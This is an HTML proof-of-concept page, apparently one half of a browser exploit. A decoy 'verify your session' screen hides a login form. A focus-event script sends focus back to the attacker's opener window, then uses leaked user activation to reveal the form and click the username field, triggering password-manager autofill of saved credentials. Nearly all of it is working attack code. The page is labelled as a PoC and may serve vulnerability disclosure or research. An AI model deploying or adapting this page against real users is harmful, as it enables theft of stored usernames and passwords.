<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>PoC - Target Page</title>
</head>

<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">

    <div id="status-container">
        <h1>Processing...</h1>
        <p>Please wait while we verify your session.</p>
    </div>

    <div id="secret-form"
        style="display: none; margin-top: 20px; background: white; padding: 20px; border-radius: 8px; border: 1px solid #ccc; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
        <h3>Login to Continue</h3>
        <input type="text" id="user-field" name="username" autocomplete="username" placeholder="Username"
            style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
        <input type="password" id="pass-field" name="password" autocomplete="current-password" placeholder="Password"
            style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
    </div>

    <script>
        let currentStage = 1;

        function backToAttacker() {
            if (window.opener) {
                window.opener.focus();
            }
        }

        function checkAndExploit() {
            const isActive = navigator.userActivation.isActive;
            const formContainer = document.getElementById('secret-form');
            const statusContainer = document.getElementById('status-container');
            const userField = document.getElementById('user-field');

            console.log(`[Stage ${currentStage}] Focus detected. Activation:`, isActive);

            if (currentStage === 1) {
                console.log("[*] Stage 1: Stealth mode. Returning focus...");
                backToAttacker();
                currentStage = 2;
            }
            else if (currentStage === 2 && isActive) {
                console.log("[!] Stage 2: LEAK DETECTED! Revealing and triggering Autofill...");
                statusContainer.style.display = 'none';
                formContainer.style.display = 'inline-block';
                userField.focus();
                userField.click();

            }
        }
        window.addEventListener("focus", checkAndExploit);
    </script>
</body>

</html>
